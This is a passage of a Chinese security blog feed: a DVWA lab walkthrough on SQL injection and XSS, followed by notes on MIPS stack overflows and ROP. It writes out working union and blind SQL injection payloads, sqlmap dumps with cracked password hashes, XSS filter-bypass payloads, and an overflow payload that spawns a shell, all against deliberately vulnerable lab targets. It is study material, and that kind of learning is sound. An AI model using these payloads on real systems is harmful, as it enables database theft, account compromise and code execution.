class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</span><br><span class="line">First name: guestbook</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</span><br><span class="line">First name: users</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p><p>开始爆字段然而我并不知道怎么爆字段😞于是猜测是<code>password</code></p><blockquote><p>1' union select password,2 from users</p></blockquote><p>得到了：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: e99a18c428cb38d5f260853678922e03</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">Surname: 2</span><br><span class="line">ID: 1&apos; union select password, 2 from users #</span><br><span class="line">First name: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p><p>小白之旅到此结束</p><h3>升级到medium</h3><p>改成了post方式提交数据这时候<code>sqlmap</code>派上用场了</p><p>先将抓到的数据包保存为<code>dvwa.txt</code>文件然后</p><blockquote><p>python sqlmap.py -r &quot;dvwa.txt&quot; --dbs</p></blockquote><p>sqlmap很聪明的判断出这是MYSQL数据库并且列出了所有的数据库</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[22:21:04] [INFO] fetching database names</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure></p><p>不过这个payload很神奇<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span><br><span class="line">    Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: id=1 AND SLEEP(5)&amp;Submit=Submit</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit</span><br></pre></td></tr></table></figure></p><p>指定数据库爆表</p><blockquote><p>python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa --tables</p></blockquote><p>得到：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: dvwa</span><br><span class="line">[2 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| guestbook |</span><br><span class="line">| users     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure></p><p>指定表爆字段</p><blockquote><p>python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --columns</p></blockquote><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Database: dvwa</span><br><span class="line">Table: users</span><br><span class="line">[8 columns]</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| Column       | Type        |</span><br><span class="line">+--------------+-------------+</span><br><span class="line">| user         | varchar(15) |</span><br><span class="line">| avatar       | varchar(70) |</span><br><span class="line">| failed_login | int(3)      |</span><br><span class="line">| first_name   | varchar(15) |</span><br><span class="line">| last_login   | timestamp   |</span><br><span class="line">| last_name    | varchar(15) |</span><br><span class="line">| password     | varchar(32) |</span><br><span class="line">| user_id      | int(6)      |</span><br><span class="line">+--------------+-------------+</span><br></pre></td></tr></table></figure></p><p>指定表然后dump数据</p><blockquote><p>python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --dump-all</p></blockquote><p>sqlmap很机智的在破解md5<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;</span><br><span class="line">[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;</span><br><span class="line">[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos;</span><br></pre></td></tr></table></figure></p><p>得到的表<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">| user_id | avatar                                           | user    | password                                    | last_name | first_name | last_login          | failed_lo</span><br><span class="line">gin |</span><br><span class="line">+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+----------</span><br><span class="line">----+</span><br><span class="line">| 1       | http://192.168.41.161/hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 2       | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 3       | http://192.168.41.161/hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 4       | http://192.168.41.161/hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">| 5       | http://192.168.41.161/hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2019-07-15 13:57:22 | 0            |</span><br><span class="line">+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+</span><br></pre></td></tr></table></figure></p><p>sqlmap tql tql tql</p><h3>high</h3><p>这时候就很。。<img src="https://i.loli.net/2019/07/15/5d2c8e18e504271047.png" alt="high"></p><p>会弹出一个页面，输入数据之后再跳回来这就很安全了😛但是。。查看源码之后发现：其实没有任何过滤；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check database</span></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br></pre></td></tr></table></figure></p><p>所以payload照样用，没问题</p><h3>impossible</h3><p>这次就更不一般了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Was a number entered?</span><br><span class="line">if(is_numeric( $id )) &#123;</span><br><span class="line">// Check the database</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// Make sure only 1 result is returned</span><br><span class="line">if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[ &apos;first_name&apos; ];</span><br><span class="line">$last  = $row[ &apos;last_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里用到了PDO预编译的方式那可能就真的没办法了</p><p>看了下<code>stackoverflow</code><a href="https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php/60496#60496" target="_blank" rel="noopener">How can I prevent SQL injection in PHP?</a></p><blockquote><p>Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL.</p></blockquote><p>可以有两种方式：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));</span><br><span class="line"></span><br><span class="line">foreach ($stmt as $row) &#123;</span><br><span class="line">    // Do something with $row</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>或者对于mysql来说，可以：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);</span><br><span class="line">$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"></span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">while ($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">    // Do something with $row</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PDO真的是安全的吗？<a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection" target="_blank" rel="noopener">Are PDO prepared statements sufficient to prevent SQL injection?</a><a href="https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602" target="_blank" rel="noopener">SQL injection that gets around mysql_real_escape_string()</a></p><h2>XSS reflected</h2><p>第一遍在chrome上试了下<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>没成功但是看源码：</p><p><img src="https://i.loli.net/2019/07/15/5d2c94341de9b41277.png" alt="xss0"></p><p>可能是chrome太安全了吧换成firefox就没事了</p><p><img src="https://i.loli.net/2019/07/15/5d2c9456115fc37192.png" alt="xss1"></p><h3>medium</h3><p>如果看源码就会发现只是简单地对<code>script</code>进行了一次过滤</p><p><code>$name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );</code>那么如何绕过这个限制呢</p><p>那就这样构造<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code>就能绕过过滤了，主要问题还是过滤不严格，之过滤了一次，所以双写就能很容易地绕过了</p><p>ps. 大小写也可以</p><p><img src="https://i.loli.net/2019/07/15/5d2c954361c0181578.png" alt="xss2"></p><h3>high</h3><p>这次过滤更严格了<code>$name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );</code></p><p>最后只留了一个<code>&gt;</code>给你</p><p>果然我记得还有<code>img</code>标签也可以造成xss来着<code>&lt;img src=&quot;aa&quot; onError=alert(123) &gt;</code>这样就行啦，当然chrome太安全了，还是用firefox吧</p><h3>impossible</h3><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure></p><p>这种情况下还进行了实体编码，看你怎么绕过</p><p><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter</a></p><p>一篇总结了xss的文章</p><h2>sql 盲注</h2><p>从low开始看起，直接抓包然后将数据包保存起来，用sqlmap跑一下就就出来了，-r参数是读取一个数据包中的文件，然后sqlmap会自动解析它</p><h3>mediume</h3><p>一样的，只是数据包变成了post方式提交的</p><h3>high</h3><p>这次sqlmap抽风没跑出来看下源码好了本来盲注就是要通过脚本来跑的，但是我比较懒emmm，还是要复习一下如何用python脚本跑出来</p><p>如何盲注？</p><p><a href="https://www.anquanke.com/post/id/170626#h3-18" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></p><p>盲注最常见的一个payload<code>127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80–+</code> 判断数据库中第一个表的第一个字符为否为'P'</p><h2>xss 存储型</h2><p>还是最简单的low表单上的<code>name</code>有长度限制，不过这只是前端的限制而已<code>&lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt;</code>注入成功</p><h3>medium</h3><p>这就很尴尬了。。原来这就是存储型xss的厉害了，直接存进去了，所以我打开medium的页面时，连着弹出了两个框框，于是想看一下它的源码：</p><p>这里也是通过大小写或者双写就能绕过的</p><p><code>&lt;sCriPt&gt;alert(1)&lt;/script&gt;</code></p><p>找到了一个xss平台</p><p><a href="http://xssye.com/index.php?do=project&amp;act=view&amp;id=3761" target="_blank" rel="noopener">xss平台</a></p><p>但是我发现我不会用了。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;DVWA&lt;/h1&gt;
&lt;p&gt;用的vulstudy的环境
默认用户名是&lt;code&gt;admin&lt;/code&gt;密码是&lt;code&gt;password&lt;/code&gt;
需要启动的时候&lt;code&gt;docker-compose up -d&lt;/code&gt;就行了
停止的话&lt;code&gt;docker
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>IOT 栈溢出笔记</title>
    <link href="https://prontosil.club/2019/07/20/IOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/20/IOT-栈溢出笔记/</id>
    <published>2019-07-20T01:04:36.000Z</published>
    <updated>2019-07-22T05:26:18.420Z</updated>
    
    <content type="html"><![CDATA[<h1>MIPS栈溢出</h1><h2>x86和MIPS指令集</h2><p>在我的理解看来，x86对于栈的操作多了push和pop操作，而MIPS指令集并没有这些，同时两者一个是小端序，一个是大端序，但是不知道为什么，在调试程序的时候依旧用的是小端序emmmm</p><h3>MISP指令集存在栈溢出的原因</h3><p>叶子函数和非叶子函数</p><blockquote><p>叶子函数的返回地址是直接放在 ra 寄存器中，而非叶子函数需要调用另外的函数，这里的差异就照成了非叶子函数需要把当前的返回地址暂时存放在栈上</p></blockquote><h2>实验环境</h2><p>attifyOS虚拟机，基本内置了我需要的所有工具，当然其中的IDA似乎过期了，去吾爱破解上找了一个Linux版本的IDA安装了</p><p><a href="https://www.52pojie.cn/thread-450156-1-1.html" target="_blank" rel="noopener">吾爱破解链接</a></p><h2>MIPS动态调试</h2><p>使用<code>qemu-mipsel</code>或者<code>qemu-mipsel-static</code>进行调试，qemu支持使用gdb进行调试，-g选项开启一个端口，IDA可以连接上这个端口从而进行动态调试。之前在看雪的虚拟机上只能用<code>qemu-mipsel-static</code>调试，后来换成了<code>attifyOS</code>发现两者都行。不过如果缺少动态链接库的话还是需要<code>chroot</code>同时将相应的库拷贝过来。</p><h2>简单的栈溢出</h2><p>源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void has_stack(char *src)&#123;</span><br><span class="line">        char dst[20] = &#123;0&#125;;</span><br><span class="line">        strcpy(dst,src);</span><br><span class="line">        printf(&quot;copy success!n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main(int argc,char *argv[])&#123;</span><br><span class="line">        has_stack(argv[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用<code>mipsel-linux-gcc</code>进行编译</p><p><code>mipsel-linux-gcc ./stack01.c -o stack01 -static</code></p><p>编译之后得到：<code>root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></p><p>使用IDA查看反汇编：</p><p>由于main函数中调用了其他的函数，所以main函数必然是非叶子函数，当然这里我们不是覆盖main函数的返回地址，因为<code>has_stack</code>函数也是非叶子函数，而且<code>strcpy</code>没有对长度做限制。</p><p><code>strcpy</code>的第一个参数dst存放在<code>$a0</code>中，第二个参数src存放在<code>$a1</code>中，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00400410                 sw      $zero, 0x38+var_10($fp)</span><br><span class="line">.text:00400414                 addiu   $v0, $fp, 0x38+var_20 #要拷贝到的地方</span><br><span class="line">.text:00400418                 move    $a0, $v0</span><br><span class="line">.text:0040041C                 lw      $a1, 0x38+arg_0($fp)  # 要拷贝的内容</span><br><span class="line">.text:00400420                 la      $v0, strcpy</span><br><span class="line">.text:00400424                 move    $t9, $v0</span><br><span class="line">.text:00400428                 jalr    $t9 ; strcpy</span><br><span class="line">.text:0040042C                 nop</span><br><span class="line">.text:00400430                 lw      $gp, 0x38+var_28($fp)</span><br></pre></td></tr></table></figure></p><p>偷懒一点不仔细分析栈了</p><p>使用<code>patternLocOffset.py</code>工具生成长度为30的字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/home/oit [oit@ubuntu] [4:31]</span><br><span class="line">&gt; python patternOffset.py -c -l 30</span><br><span class="line">[*] Create pattern string contains 30 characters ok!</span><br><span class="line">[+] output to patternShell.txt ok!</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure></p><p>动态调试：<code>./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9</code></p><p>直接在调用函数返回的地方下断点，查看此时的<code>$ra</code>寄存器的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00400450 move    $sp, $fp</span><br><span class="line">.text:00400454 lw      $ra, 0x38+var_4($sp)</span><br><span class="line">.text:00400458 lw      $fp, 0x38+var_8($sp)</span><br><span class="line">.text:0040045C addiu   $sp, 0x38</span><br><span class="line">.text:00400460 jr      $ra (断点)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/UsAmD68.png" alt="ra3"></p><p>计算需要<code>padding</code>的长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; python patternOffset.py -s 0x62413961 -l 30</span><br><span class="line">[*] Create pattern string contains 30 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 28 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0008 s</span><br></pre></td></tr></table></figure></p><p>需要填充28个字节</p><p>最后的payload</p><blockquote><p>./qemu-mipsel-static -g 1234 ./stack01 `python -c &quot;print 'a'*28+'\x90\x03\x40\x00'&quot;`</p></blockquote><p>此时成功地发生了跳转<img src="https://i.imgur.com/nAokUL0.png" alt="vuln"></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/stack# ./qemu-mipsel-static  ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# ls</span><br><span class="line">core     qemu-mipsel-static  stack01    stack01.id0  stack01.idb  stack01.til</span><br><span class="line">qemu-mipsel  ret2txt.c stack01.c  stack01.id1  stack01.nam</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><h2>ROP chain</h2><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void do_system_0(int code,char *cmd)</span><br><span class="line">&#123;</span><br><span class="line">    char buf[255];</span><br><span class="line">    //sleep(1);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[256]=&#123;0&#125;;</span><br><span class="line">    char ch;</span><br><span class="line">    int count = 0;</span><br><span class="line">    unsigned int fileLen = 0;</span><br><span class="line">    struct stat fileData;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    if(0 == stat(&quot;passwd&quot;,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    else</span><br><span class="line">        return 1;</span><br><span class="line"></span><br><span class="line">    if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Cannot open file passwd!n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    while(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = &apos;x00&apos;;</span><br><span class="line"></span><br><span class="line">    if(!strcmp(buf,&quot;adminpwd&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system_0(count,&quot;ls -l&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;you have an invalid password!n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处main函数明显是非叶子函数，我们要想办法调用<code>do_system_0</code>这个函数那就要想办法控制<code>$a1</code>寄存器，那样就可以执行任何命令</p><p><code>mipsrop.stackfinder()</code>查找gadget<img src="https://i.imgur.com/FJpReqv.png" alt="mips_rop"></p><p>我们选择<code>0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp)</code></p><p>要做到跳转到我们的<code>gadget</code>，需要覆盖main函数的返回地址</p><p>先计算要padding的长度</p><p>此时计算出来的pattern是412，会不会太长了点(注：在我参考的文章中作者计算出来的偏移和我的不一样，刚开始我以为是自己计算错了，但是后来调试后认为自己并没有算错)<img src="https://i.imgur.com/0Q1gHli.png" alt="rop0"></p><p>接下来我尝试先覆盖main函数的返回地址跳转到rop的空间，再将<code>/bin/sh</code>字符串的地址赋值给<code>$a1</code></p><p><code>$ra</code>被覆盖<img src="https://i.imgur.com/28cvjLd.png" 